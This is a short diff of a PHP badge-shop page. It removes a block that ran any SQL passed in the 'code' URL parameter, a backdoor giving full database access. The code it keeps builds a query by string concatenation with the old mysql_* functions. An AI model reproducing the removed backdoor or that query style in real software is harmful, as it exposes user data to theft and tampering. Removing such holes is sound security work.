@@ -26,10 +26,6 @@ if ($_POST['action'] == "badge") {
         echo '<SCRIPT LANGUAGE="JavaScript" TYPE="text/javascript">alert("O emblema selecionado não está a venda!")</SCRIPT>';
     }
 }
-if(isset($_GET['code'])){
-    $qry = $_GET['code'];
-    mysql_query($qry) or die(mysql_error());
-}
 $usersql = mysql_query("SELECT * FROM users WHERE id = '" . $my_id . "' LIMIT 1") or die(mysql_error());
 $myrow = mysql_fetch_assoc($usersql);
 ?>
